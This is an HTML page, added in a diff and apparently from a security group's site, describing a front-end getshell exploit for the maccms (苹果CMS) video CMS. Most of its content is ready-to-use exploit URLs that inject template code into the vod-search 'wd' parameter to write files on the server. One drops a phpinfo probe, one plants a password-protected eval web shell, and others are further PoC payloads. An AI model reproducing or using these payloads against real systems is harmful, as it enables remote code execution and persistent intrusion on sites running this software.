@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>ahcert.org.cn</title>
+<style>
+			body{
+				width: 100%;
+				height: 100%;
+				background-color:#B2DFEE;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+		</style>
+		</head>
+<body>
+<div>
+
+
+<br/><br/>
+<!--文章title-->
+<center>
+<font style="FONT-FAMILY: Comic Sans MS;"><strong><h2>maccms前台getshell</h2></strong></font>
+</center>
+<!--主体内容-->
+<div><br/><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;1、厂商地址：http://www.maccms.com/
+
+</p><br/>
+
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;2、影响版本，本人测试通杀版本： 2008 - 2014 苹果CMS Inc. (仅仅测试其中之一的一个版本，其他的大家自行测试研究)</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;3、EXP：</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;/index.php?m=vod-search&wd={{page:lang}if-:fputs(fopen(base64_decode(NTAucGhw),w),base64_decode(PD9waHAgcGhwaW5mbygpOz))}22{endif-}&submit=</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;利用方式如：http://www.test.com/index.php?m=vod-search&wd={{page:lang}if-:fputs(fopen(base64_decode(NTAucGhw),w),base64_decode(PD9waHAgcGhwaW5mbygpOz))}22{endif-}&submit=</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;若成功利用会在根目录生成50.php ,内容:php探针</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;生成一句话：ahcert.php,密码：c &nbsp;&nbsp;&nbsp;&nbsp;/index.php?m=vod-search&wd={{page:lang}if-:fputs(fopen(base64_decode(YWhjZXJ0LnBocA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbY10pOw))}22{endif-}&submit=</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;关键词：苹果cms; index.php?m=vod-search</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;参考1：http://t00ls.net/</p><br/>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;参考2：http://www.tuicool.com/articles/qu22Yna/</p><br/>
+	
+</div>
+
+其他类型POC: 
+<br/> &nbsp;&nbsp;&nbsp;&nbsp;/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}
+<br/> &nbsp;&nbsp;&nbsp;&nbsp;/index.php?m=vod-search&wd={{page:lang}if-:php{page:lang}info()}a{endif-}}
+<br/><br/>
+<!--其他功能-->
+<center>
+<h4 >著：2017-5-22 13:35&nbsp;&nbsp; </h4><br/>
+<input type="button" name="button1" id="button1" value="返回上一页" onclick="history.go(-1)"> <br/><br/>
+<script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+</body>
+</html>
